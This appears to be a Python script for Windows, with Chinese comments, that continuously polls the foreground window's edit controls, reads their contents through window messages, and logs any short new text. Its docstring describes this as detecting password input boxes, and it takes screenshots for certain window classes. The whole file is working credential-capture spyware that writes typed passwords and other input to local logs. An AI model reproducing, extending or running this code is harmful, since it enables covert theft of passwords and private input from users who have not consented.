import os
import time
import ctypes

from ctypes import wintypes
from datetime import datetime
from utils.utils_lib import LoggerManager, ConfigManager, Utils
from utils.capture_screen import capture_screen, user32


def GetClassName(hwnd) -> str:
    buffer = ctypes.create_unicode_buffer(256)
    user32.GetClassNameW(hwnd, buffer, 256)
    return buffer.value


def GetWindowText(hwnd) -> str:
    length = user32.GetWindowTextLengthW(hwnd)
    buffer = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value


def find_edit_controls(hwnd, class_keyword) -> list:
    """查找指定窗口句柄下的所有编辑控件"""
    edit_controls = []

    def callback(child_hwnd, _):
        try:
            class_name = GetClassName(child_hwnd)
            if class_keyword in class_name:
                parent_hwnd = user32.GetParent(child_hwnd)
                if parent_hwnd:
                    parent_title = GetWindowText(parent_hwnd)
                    parent_class = GetClassName(parent_hwnd)
                    edit_controls.append(
                        [class_name, child_hwnd, parent_title, parent_class])
        except Exception as e:
            return None
        return True
    WNDENUMPROC = ctypes.WINFUNCTYPE(
        wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    user32.EnumChildWindows(hwnd, WNDENUMPROC(callback), None)
    return edit_controls


def get_edit_text(hwnd) -> str:
    """获取编辑控件的文本内容"""
    text_length = user32.SendMessageW(hwnd, 14, 0, 0)
    buffer = ctypes.create_unicode_buffer(text_length + 1)
    user32.SendMessageW(hwnd, 13, text_length + 1, ctypes.byref(buffer))
    return buffer.value


def save_screenshot() -> str:
    """保存当前屏幕截图"""
    screenshot_dir = 'screenshots'
    os.makedirs(screenshot_dir, exist_ok=True)
    current_time = datetime.now().strftime('%Y%m%d_%H%M%S')
    screenshot_path = os.path.join(screenshot_dir, f'{current_time}.png')
    success = capture_screen(screenshot_path)
    return screenshot_path if success else '保存失败'


def detect_editbox_input(target_len, detect_sleep, class_keyword):
    """持续检测密码输入框"""
    last_texts = {}
    while True:
        hwnd = user32.GetForegroundWindow()
        edit_controls = find_edit_controls(hwnd, class_keyword)
        if edit_controls:
            logger.debug(edit_controls)

        for class_name, edit_hwnd, parent_title, parent_class in edit_controls:
            current_text = get_edit_text(edit_hwnd)
            if current_text.strip():
                if (edit_hwnd not in last_texts or last_texts[edit_hwnd] != current_text) and len(current_text) <= target_len:
                    logger.info(
                        f'文本输入框(父标题[{parent_title}] 父类名[{parent_class}] 类名[{class_name}] 句柄[{edit_hwnd})])\n{current_text}')
                    last_texts[edit_hwnd] = current_text
                    logger.debug(last_texts)
                    if 'ATL:00' in parent_class:
                        screenshot_path = save_screenshot()
                        logger.info(f'截图已保存到: {screenshot_path}')
        time.sleep(detect_sleep)


if __name__ == '__main__':
    Utils.sync_work_dir(assets_dir='build')
    logger = LoggerManager()

    try:
        config = ConfigManager(logger=logger, deft_cfgs={
            "target_len": 30,
            "detect_sleep": 0.03,
            "class_keyword": "Edit"
        })
        config.load_configs()

        target_len = config.cfgs['target_len']
        detect_sleep = config.cfgs['detect_sleep']
        class_keyword = config.cfgs['class_keyword']

        if detect_sleep == 0.0:
            logger.info(
                f'开始检测输入框(目标长度<={target_len}, 检测频率(无限)次/秒, 目标类名关键字{class_keyword})...')
        else:
            logger.info(
                f'开始检测输入框(目标长度<={target_len}, 检测频率{1 / detect_sleep}次/秒, 目标类名关键字{class_keyword})...')

        detect_editbox_input(target_len, detect_sleep, class_keyword)

    except Exception as e:
        err = f'程序异常崩溃: {str(e)}'
        if logger:
            logger.error(err)
